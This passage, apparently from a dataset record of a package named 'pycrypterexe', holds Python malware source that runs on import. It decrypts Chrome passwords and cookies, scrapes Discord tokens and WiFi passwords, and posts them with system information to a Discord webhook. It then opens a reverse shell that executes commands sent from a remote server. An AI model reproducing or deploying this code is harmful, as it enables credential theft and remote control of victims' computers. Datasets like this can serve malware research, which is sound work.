self.ChromeDecrypt(row[2])\n                    _info = 'Hostname: %s\\nUsername: %s\\nPassword: %s\\n\\n' %(host,name,value)\n                    self.passwordlog += _info\n                conn.close()\n                os.remove(db_file)\n            def ChromeDecrypt(self, encrypted_txt):\n                if encrypted_txt[:4] == b'\\x01\\x00\\x00\\x00':\n                    decryptedtxt = self.DecryptDPAPI(encrypted_txt)\n                    return decryptedtxt.decode()\n                elif encrypted_txt[:3] == b'v10':\n                    decryptedtxt = self.DecryptAES(encrypted_txt)\n                    return decryptedtxt[:-16].decode()\n            def Decrypt(self, cipher, ciphertext, nonce):\n                cipher.mode = modes.GCM(nonce)\n                decryptor = cipher.decryptor()\n                return decryptor.update(ciphertext)\n            def GetCipher(self, key):\n                cipher = Cipher(\n                    algorithms.AES(key),\n                    None,\n                    backend=default_backend()\n                )\n                return cipher\n            def DecryptDPAPI(self, encrypted):\n                import ctypes\n                import ctypes.wintypes\n                class DATA_BLOB(ctypes.Structure):\n                    _fields_ = [('cbData', ctypes.wintypes.DWORD),\n                                ('pbData', ctypes.POINTER(ctypes.c_char))]\n                p = ctypes.create_string_buffer(encrypted, len(encrypted))\n                blobin = DATA_BLOB(ctypes.sizeof(p), p)\n                blobout = DATA_BLOB()\n                retval = ctypes.windll.crypt32.CryptUnprotectData(\n                    ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))\n                if not retval:\n                    raise ctypes.WinError()\n                result = ctypes.string_at(blobout.pbData, blobout.cbData)\n                ctypes.windll.kernel32.LocalFree(blobout.pbData)\n                return result\n            def LocalKey(self):\n                jsn = None\n                with open(os.path.join(os.environ['LOCALAPPDATA'], r\"Google\\Chrome\\User Data\\Local State\"), encoding='latin-1', mode =\"r\") as f:\n                    jsn = json.loads(str(f.readline()))\n                return jsn[\"os_crypt\"][\"encrypted_key\"]\n            def DecryptAES(self, encrypted_txt):\n                encoded_key   = self.LocalKey()\n                encrypted_key = base64.b64decode(encoded_key.encode())\n                encrypted_key = encrypted_key[5:]\n                key           = self.DecryptDPAPI(encrypted_key)\n                nonce         = encrypted_txt[3:15]\n                cipher        = self.GetCipher(key)\n                return self.Decrypt(cipher, encrypted_txt[15:], nonce)\n            def Main(self):\n                _full_path = os.path.join(self.APP_DATA_PATH, self.DB_PATH)\n                _temp_path = os.path.join(self.APP_DATA_PATH, 'sqlite_file')\n                shutil.copyfile(_full_path,_temp_path)\n                self.AddPassword(_temp_path)\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    file.write(str(self.passwordlog))\n                    file.close()\n                    return LOGGER.UploadFile(randomfilename, filename=\"Chrome Passwords\")\n\n        class GetChromeCookies:\n            def __init__(self):\n                local_state_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Local State\")\n                with open(local_state_path, \"r\", encoding=\"latin-1\") as f: local_state = json.loads(f.read())\n                key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n                self.key = CryptUnprotectData(key, None, None, None, 0)[1]\n            def TimeReadable(self, chromedate):\n                if chromedate != 86400000000 and chromedate:\n                    try: return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)\n                    except Exception as error: LOGGER.errors += f\"{error}\\n\"\n                else: return \"\"\n            def DecryptData(self, data, key):\n                try:\n                    from Crypto.Cipher import AES\n                    iv = data[3:15]\n                    data = data[15:]\n                    cipher = AES.new(key, AES.MODE_GCM, iv)\n                    return cipher.Decrypt(data)[:-16].decode()\n                except:\n                    try: return str(CryptUnprotectData(data, None, None, None, 0)[1])\n                    except: return \"\"\n            def Main(self):\n                db_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Default\", \"Network\", \"Cookies\")\n                filename = \"Cookies.db\"\n                if not os.path.isfile(filename):\n                    shutil.copyfile(db_path, filename)\n                db = sqlite3.connect(filename)\n                db.text_factory = lambda b: b.decode(errors=\"ignore\")\n                cursor = db.cursor()\n                cursor.execute(\"\"\"\n                SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value \n                FROM cookies\"\"\")\n                key = self.key\n                try:\n                    randomfilename = LOGGER.RndFileName()\n                    with open(randomfilename, 'w', encoding=\"latin-1\") as file:\n                        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():\n                            decrypted_value = self.DecryptData(encrypted_value, key) if not value else value\n                            file.write(f\"\"\"\n                                URL: {host_key}\n                                Cookie name: {name}\n                                Cookie value (encrypted): {encrypted_value}\n                                Cookie value (decrypted): {decrypted_value}\n                                Creation date: {self.TimeReadable(creation_utc)}\n                                Last accessed: {self.TimeReadable(last_access_utc)}\n                                Expires at: {self.TimeReadable(expires_utc)}\n                            \"\"\")\n                            cursor.execute(\"\"\"\n                            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\n                            WHERE host_key = ?\n                            AND name = ?\"\"\", (decrypted_value, host_key, name))\n                        file.close()\n                    db.commit()\n                    db.close()\n                    return LOGGER.UploadFile(randomfilename, filename=\"Chrome Cookies\")\n                except Exception as error:\n                    LOGGER.errors += f\"{error}\\n\"\n                    return \"No Chrome Cookie File\"\n\n        class DiscordTokens:\n            def __init__(self):\n                self.tokens = []\n                self.rawtokens = \"\"\n                self.tokeninfo = \"\"\n            def GetTokens(self) -> None:\n                LOCAL = os.getenv(\"LOCALAPPDATA\")\n                ROAMING = os.getenv(\"APPDATA\")\n                PATHS = {\n                    ...\n                }\n                for platform, path in PATHS.items():\n                    path = os.path.join(path, \"Local Storage\", \"leveldb\")\n                    if os.path.exists(path):\n                        for file_name in os.listdir(path):\n                            if file_name.endswith(\".log\") or file_name.endswith(\".ldb\") or file_name.endswith(\".sqlite\"):\n                                for line in [x.strip() for x in open(os.path.join(path, file_name), errors=\"ignore\").readlines() if x.strip()]:\n                                    for regex in (r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\", r\"mfa\\.[\\w-]{84}\"):\n                                        for token in re.findall(regex, line):\n                                            if token + \" -> \" + platform not in self.tokens:\n                                                self.tokens.append(token + \" -> \" + platform)\n                                                self.rawtokens += f\"\\n{token}\\n\"\n                return self.tokens\n            def Main(self):\n                self.GetTokens()\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    for index in range(len(self.tokens)):\n                        self.tokeninfo += f\"[{index+1}] {self.tokens[index]}\\n\"\n                    file.write(str(self.tokeninfo))\n                    file.close()\n                return LOGGER.UploadFile(randomfilename, filename=\"Token File\"), self.rawtokens\n            def Valid(self, token):\n                headers = { 'Authorization': token, 'Content-Type': 'application/json' }\n                r = get('https://discordapp.com/api/v9/users/@me', headers=headers)\n                return True if r.status_code == 200 else False\n\n        def Main(self):\n            WifiPass   = self.GetWifiPasswords()\n            ChromePass = self.GetChromePasswords()\n            ChromeCks  = self.GetChromeCookies()\n            DiscTokens = self.DiscordTokens()\n            wifi_passwords   = WifiPass.Main()\n            chrome_passwords = ChromePass.Main()\n            chrome_cookies   = ChromeCks.Main()\n            discord_tokens   = DiscTokens.Main()\n            system_info = \"\"\n            for key in self.INFO:\n                system_info += f\"{key} : {self.INFO[key]}\\n\"\n            embed = {\n                \"color\": 0x000000,\n                        \"fields\": [\n                            {\n                                \"name\": \"**Tokens**\",\n                                \"value\": f\"```{discord_tokens[1]}```\"\n                            },\n                            {\n                                \"name\": \"System Information\",\n                                \"value\": f\"```{system_info}```\"\n                            },\n                            {\n                                \"name\": \"Python Version\",\n                                \"value\": f\"```{pf.python_version()}```\"\n                            },\n                            {\n                                \"name\": \"System Files\",\n                                \"value\": f\"**{discord_tokens[0]}**\\n**{wifi_passwords}**\\n**{chrome_passwords}**\\n**{chrome_cookies}**\\n**{self.ErrorLog()}**\"\n                            }\n                        ],\n                        \"author\": {\n                            \"name\": f\"SylexPIP ✔️\"\n                        },\n                        \"footer\": {\n                            \"text\": f\"github.com/codeuk/sylexpip\"\n                        },\n                    }\n            heading = {\n                \"content\": f\"**SylexPIP Executed** ||@everyone||\",\n                \"embeds\": [embed],\n                \"username\": \"SylexPIP\"\n            }\n            req = post(VARIABLES.webhook, headers={\"content-type\": \"application/json\"}, data=json.dumps(heading).encode())\n            NETWORK = PROGRAM.NETWORK()\n            NETWORK.Main() if VARIABLES.REVSHELL else NETWORK.Persistence()\n\n    class NETWORK:\n        def __init__(self):\n            self.ip = get(\"https://icanhazip.com\").text.split(\"\\n\")[0]\n            self.cwd = os.getcwd()\n        def Persistence(self):\n            return None\n        def onLoad(self):\n            embed = {\n                        \"color\": 0x000000,\n                        \"fields\": [\n                            {\n                                \"name\": \"**Reverse Shell Connected**\",\n                                \"value\": f\"```{self.ip} -> {VARIABLES.serverip}:{VARIABLES.port}```\"\n                            },\n                            {\n                                \"name\": \"**Configuration**\",\n                                \"value\": f\"\"\"```PORT -> {VARIABLES.port}\\nIP   -> {self.ip}\\\n                                    \\nBUFFER -> {VARIABLES.buffer}\\nSERVER -> {VARIABLES.serverip}```\"\"\"\n                            }\n                        ],\n                        \"author\": {\"name\": f\"SylexPIP ✔️\"},\n                        \"footer\": {\"text\": f\"github.com/codeuk/sylexpip\"},\n                    }\n            heading = { \"content\": \"\", \"embeds\": [embed], \"username\": \"SylexPIP\" }\n            req = post(VARIABLES.webhook, headers={\"content-type\": \"application/json\"}, data=json.dumps(heading).encode())\n        def Main(self):\n            s = sock.socket()\n            s.connect((VARIABLES.serverip, VARIABLES.port))\n            s.send(self.cwd.encode())\n            self.onLoad()\n            while True:\n                try:\n                    command = s.recv(VARIABLES.buffer).decode()\n                    split_command = command.split()\n                    if split_command[0] == \"localtunnel\":\n                        try:\n                            tunnel_port = split_command[1]\n                            tunnel_inst = sp.getoutput(\"npm install -g localtunnel\")\n                            tunnel_link = sp.getoutput(f\"lt --port {tunnel_port}\")\n                            http_server = sp.getoutput(f\"python -m http.server --directory C:// {tunnel_port}\")\n                            output = f\"[*] Started localtunnel @ {tunnel_link}\"\n                        except Exception as error:\n                            output = \"[!] Couldn't start localtunnel: \", error\n                    elif command.lower() == \"exit\":\n                        break\n                    else:\n                        output = sp.getoutput(command)\n                    message = f\"{output}\\n\"\n                    s.send(message.encode())\n                except Exception as error:\n                    s.send(\"[!] Error on client side!\".encode())\n            s.close()\n\nPROGRAM = EVIL()\nLOGGER  = PROGRAM.LOGGER()\nLOGGER.Main()\nprint(VARIABLES.endText if VARIABLES.printOnEnd else \"\")"
    }
  },
  {
    "metadata": {
      "package_name": "pycrypterexe-1.2.2"
    }
  }
]